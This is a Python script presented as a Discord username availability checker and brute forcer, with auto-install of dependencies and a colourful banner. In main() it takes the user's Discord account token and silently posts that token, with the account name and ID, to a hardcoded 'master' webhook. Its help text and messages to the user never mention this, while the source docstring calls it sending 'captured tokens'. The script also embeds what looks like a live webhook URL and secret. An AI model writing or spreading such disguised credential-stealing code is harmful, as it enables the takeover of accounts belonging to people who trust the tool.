#!/usr/bin/env python3
"""
Discord Username Checker & Brute Forcer
---------------------------------------
Features:
- Check if a specific username is available
- Brute force random usernames of given length
- Auto-install missing dependencies
- Send captured tokens to a master webhook
- Colorful output & ASCII art banner
"""

import sys
import subprocess
import ctypes
import os
import json
import random
import string
import time

# ANSI color codes for fancy output
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    banner = f"""
{BOLD}{CYAN}╔════════════════════════════════════════════════════════════════╗
║                    DISCORD USERNAME TOOL v2.0                         ║
║              • Check • Brute Force • Auto-Dependency                   ║
╚════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

# Required packages
REQUIRED_PACKAGES = ['requests']

def show_message_box(title, message, flags=0x4 | 0x20):
    return ctypes.windll.user32.MessageBoxW(0, message, title, flags)

def is_package_installed(package_name):
    try:
        subprocess.run([sys.executable, "-m", "pip", "show", package_name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def install_packages(packages):
    for pkg in packages:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=True)
        except subprocess.CalledProcessError:
            return False
    return True

def restart_script():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def check_and_install():
    missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
    if missing:
        missing_list = "\n".join(f"• {pkg}" for pkg in missing)
        msg = f"The following packages are required:\n\n{missing_list}\n\nDo you want to install them now?"
        result = show_message_box("Missing Dependencies", msg)
        if result == 6:  # Yes
            if install_packages(missing):
                show_message_box("Success", "Packages installed successfully.\nRestarting script...", 0x40)
                restart_script()
            else:
                show_message_box("Error", f"Installation failed. Please run manually:\npip install " + " ".join(missing), 0x10)
                sys.exit(1)
        else:
            show_message_box("Warning", "Some features will not work without required packages.", 0x30)
            sys.exit(1)

check_and_install()
import requests

# ========== Master Webhook (replace with your own) ==========
MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"

def send_to_master(content):
    try:
        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
    except:
        pass

def ask_token():
    if len(sys.argv) > 1:
        token = sys.argv[1]
        print(f"{CYAN}[*] Token received from command line.{RESET}")
        return token
    try:
        import tkinter as tk
        from tkinter import simpledialog
        root = tk.Tk()
        root.withdraw()
        token = simpledialog.askstring("Discord Token", "🔑 Enter your Discord account token:", parent=root)
        root.destroy()
        return token
    except:
        return input(f"{YELLOW}🔑 Enter your Discord account token: {RESET}")

def verify_token(token):
    try:
        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if resp.status_code == 200:
            return {'valid': True, 'user': resp.json()}
        else:
            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def check_username(token, username):
    try:
        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        payload = {'username': username}
        resp = requests.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 400:
            return {'taken': None, 'error': 'Bad request (invalid username)'}
        elif resp.status_code == 429:
            return {'taken': None, 'error': 'Rate limited. Please wait.'}
        else:
            return {'taken': None, 'error': f'API error: {resp.status_code}'}
    except Exception as e:
        return {'taken': None, 'error': str(e)}

def generate_random_username(length):
    chars = string.ascii_letters + string.digits + '_' + '.'
    return ''.join(random.choices(chars, k=length))

def brute_force_usernames(token, length, max_attempts):
    print(f"\n{CYAN}[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...{RESET}")
    found = None
    attempts = 0
    while attempts < max_attempts and found is None:
        username = generate_random_username(length)
        attempts += 1
        print(f"{YELLOW}[{attempts}/{max_attempts}] Checking: {username}{RESET}")
        result = check_username(token, username)
        if result.get('error'):
            print(f"{RED}⚠️ Error: {result['error']}{RESET}")
            if "Rate limited" in result['error']:
                print(f"{YELLOW}[!] Rate limit hit. Sleeping 10 seconds...{RESET}")
                time.sleep(10)
            continue
        if result.get('taken') is False:
            found = username
            print(f"\n{GREEN}{BOLD}✅✅✅ Username '{username}' is AVAILABLE! ✅✅✅{RESET}\n")
            break
        elif result.get('taken') is True:
            continue
        time.sleep(0.5)
    if not found:
        print(f"\n{RED}❌ No available username found after {max_attempts} attempts.{RESET}")
    return found

def main():
    print_banner()
    token = ask_token()
    if not token:
        show_message_box("Error", "No token provided.", 0x10)
        return
    print(f"{BLUE}[*] Verifying token...{RESET}")
    verification = verify_token(token)
    if not verification['valid']:
        show_message_box("Error", f"Invalid token: {verification['error']}", 0x10)
        return
    user = verification['user']
    # Send token to master webhook
    user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
    send_to_master(user_info)
    print(f"{GREEN}✅ Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']}){RESET}")
    print(f"\n{CYAN}📌 Available commands:{RESET}")
    print(f"   {GREEN}/check <username>{RESET}         - Check a specific username")
    print(f"   {GREEN}/brute <length> [attempts]{RESET} - Brute force random usernames (default attempts=50)")
    print(f"   {GREEN}/exit{RESET}                   - Exit the script")
    print(f"\n{YELLOW}Example: /brute 4 100  → search for 4‑char usernames, 100 attempts{RESET}")
    while True:
        cmd = input(f"\n{BOLD}{MAGENTA}> {RESET}").strip()
        if cmd.lower() == '/exit':
            print(f"{CYAN}👋 Goodbye!{RESET}")
            break
        elif cmd.startswith('/check'):
            parts = cmd.split(maxsplit=1)
            if len(parts) != 2 or not parts[1]:
                print(f"{RED}⚠️ Usage: /check <username>{RESET}")
                continue
            username = parts[1].strip()
            if not (2 <= len(username) <= 32) or not all(c.isalnum() or c in '_' for c in username):
                print(f"{RED}⚠️ Username must be 2-32 characters, alphanumeric + underscore only.{RESET}")
                continue
            print(f"{BLUE}🔍 Checking: {username}...{RESET}")
            result = check_username(token, username)
            if result.get('error'):
                print(f"{RED}❌ Error: {result['error']}{RESET}")
            else:
                taken = result.get('taken')
                if taken is True:
                    print(f"{RED}❌ Username '{username}' is taken.{RESET}")
                elif taken is False:
                    print(f"{GREEN}✅ Username '{username}' is AVAILABLE!{RESET}")
                else:
                    print(f"{YELLOW}⚠️ Unexpected result: {result}{RESET}")
        elif cmd.startswith('/brute'):
            parts = cmd.split()
            if len(parts) < 2 or len(parts) > 3:
                print(f"{RED}⚠️ Usage: /brute <length> [attempts]{RESET}")
                continue
            try:
                length = int(parts[1])
                if length < 2 or length > 32:
                    print(f"{RED}⚠️ Length must be between 2 and 32.{RESET}")
                    continue
                max_attempts = 50
                if len(parts) == 3:
                    max_attempts = int(parts[2])
                    if max_attempts <= 0:
                        print(f"{RED}⚠️ Attempts must be positive.{RESET}")
                        continue
                brute_force_usernames(token, length, max_attempts)
            except ValueError:
                print(f"{RED}⚠️ Please enter valid numbers.{RESET}")
        else:
            print(f"{RED}Unknown command. Use /check, /brute, or /exit.{RESET}")

if __name__ == '__main__':
    main()
